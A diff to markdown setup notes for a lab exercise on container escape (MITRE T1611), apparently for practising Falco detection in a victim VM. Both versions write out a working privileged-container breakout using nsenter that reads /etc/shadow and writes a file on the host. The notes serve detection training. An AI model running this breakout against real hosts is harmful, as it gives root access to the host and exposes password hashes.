@@ -1,23 +1,24 @@
-# T1611 Container Escape - lab setup
+# T1611 - container escape (setup notes)
 
-This is Falco's flagship use case and almost no entry-level candidate can demo it. Worth
-the extra setup. Needs docker inside the victim VM (adds ~400MB - fine on the 20G disk).
+Needs docker inside the victim VM (~400 MB, fine on the 20 G disk). Install it before
+taking the clean snapshot if you want it baked into the reset state.
 
-## One-time setup (on the victim)
+## Setup (on the victim)
 ```bash
 vm/ssh.sh 'curl -fsSL https://get.docker.com | sudo sh && sudo usermod -aG docker analyst'
-vm/rollback.sh   # NO - do this BEFORE snapshotting if you want it in the clean image
 ```
 
-## The escape to detect (privileged-container breakout)
+## The escape
+A privileged container with `--pid=host` uses `nsenter` to enter the host's namespaces and
+read/write the host filesystem:
 ```bash
-# attacker runs a privileged container and breaks out to the host filesystem
-docker run --rm -it --privileged --pid=host ubuntu \
-  nsenter -t 1 -m -u -n -i bash -c 'id; cat /etc/shadow | head -1'
+docker run --rm --privileged --pid=host ubuntu \
+  nsenter -t 1 -m -u -n -i bash -c 'id; head -1 /etc/shadow; touch /host-escape-proof'
 ```
-Falco default rules that should fire: "Launch Privileged Container",
-"Change thread namespace", "Read sensitive file untrusted" (from host context).
+The proof file appearing on the host confirms the breakout.
 
-## Why it matters on the resume
-Container-native detection is where cloud SOC work is going. One tuned T1611 rule with a
-runbook says "I understand runtime security," which is a tier above alert-queue triage.
+## Detection
+Falco catches the host-file access at runtime; the launching command also carries obvious
+flags (`--privileged`, `nsenter -t 1`). See the detection file. Enabling Falco's "Launch
+Privileged Container" / "Change thread namespace" rules gives more direct coverage of the
+launch itself.
